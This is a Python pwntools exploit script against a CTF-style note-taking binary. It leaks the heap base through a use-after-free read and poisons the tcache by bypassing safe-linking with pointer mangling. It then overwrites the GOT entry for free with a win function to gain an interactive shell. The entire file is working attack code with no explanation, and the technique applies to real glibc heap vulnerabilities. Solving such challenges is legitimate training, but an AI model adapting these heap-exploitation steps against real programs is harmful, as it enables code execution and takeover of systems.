#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('note_patched')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/note/note"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def create_note(idx, size, data):
    io.sendlineafter(b">", b"1")
    io.sendlineafter(b":", str(idx).encode())
    io.sendlineafter(b":", str(size).encode())
    io.sendafter(b":", data)

def read_note(idx):
    io.sendlineafter(b">", b"2")
    io.sendlineafter(b":", str(idx).encode())
    io.recvuntil(b"data: ")
    data = io.recvline().strip(b"\n")
    return data

def update_note(idx, data):
    io.sendlineafter(b">", b"3")
    io.sendlineafter(b":", str(idx).encode())
    io.sendafter(b":", data)

def delete_note(idx):
    io.sendlineafter(b">", b"4")
    io.sendlineafter(b":", str(idx).encode())

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val 


def solve():

    note_list = 0x4040B0
    win_func = 0x401256
    
    create_note(0, 0x30, b"leaks")
    delete_note(0)
    heap_base = u64(read_note(0).ljust(8, b"\x00")) << 12
    info("heap base: %#x", heap_base)

    for i in range(1, 10):
        create_note(i, 0x20, b"A"*8)

    for i in range(1, 9):
        delete_note(i)
    
    create_note(0, 0x30, b"pwned")
    create_note(1, 0x20, b"junk1")
    create_note(2, 0x20, b"junk2")

    delete_note(1)
    delete_note(2)

    addr = mangle(heap_base, note_list - 0x10)
    update_note(2, p64(addr))

    create_note(2, 0x20, b"pwned")
    create_note(3, 0x20, p64(exe.got["free"]) + p64(0x20))

    update_note(0, p64(win_func))

    io.sendlineafter(b">", b"4")
    io.sendlineafter(b":", b"3")

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()